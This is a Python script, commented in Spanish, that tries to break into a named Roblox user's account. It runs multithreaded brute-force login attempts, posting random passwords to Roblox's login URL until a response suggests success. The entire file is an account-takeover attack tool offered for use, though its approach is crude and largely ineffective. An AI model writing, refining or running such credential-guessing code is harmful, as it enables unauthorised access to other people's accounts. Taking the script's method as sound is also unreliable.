import requests

import random

import string

import threading

import time


# Solicitar nombre de usuario

username = input("Ingrese el nombre de usuario de Roblox: ")


# Configuración de headers

headers = {

    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',

    'Content-Type': 'application/json'

}


# URL del endpoint de Roblox para iniciar sesión

login_url = 'https://www.roblox.com/login'


# Función para generar contraseñas aleatorias

def generate_random_password(length=12):

    characters = string.ascii_letters + string.digits + string.punctuation

    return ''.join(random.choice(characters) for _ in range(length))


# Función para intentar iniciar sesión con una contraseña

def try_password(password):

    payload = {

        'username': username,

        'password': password

    }

    response = requests.post(login_url, headers=headers, json=payload)

    if 'userId' in response.text:

        print(f"\n✅ Contraseña encontrada: {password}")

        return True

    else:

        print(f"❌ Contraseña incorrecta: {password}")

        return False


# Función que se ejecutará en cada hilo

def brute_force_thread(thread_id):

    while True:

        password = generate_random_password()

        if try_password(password):

            break

        time.sleep(0.1)  # Pequeño retraso entre intentos


# Solicitar al usuario el número de hilos

num_threads = int(input("Ingrese el número de hilos (threads) que desea usar: "))


# Crear y arrancar hilos

threads = []

for i in range(num_threads):

    t = threading.Thread(target=brute_force_thread, args=(i,))

    t.start()

    threads.append(t)


# Esperar a que todos los hilos terminen

for t in threads:

    t.join()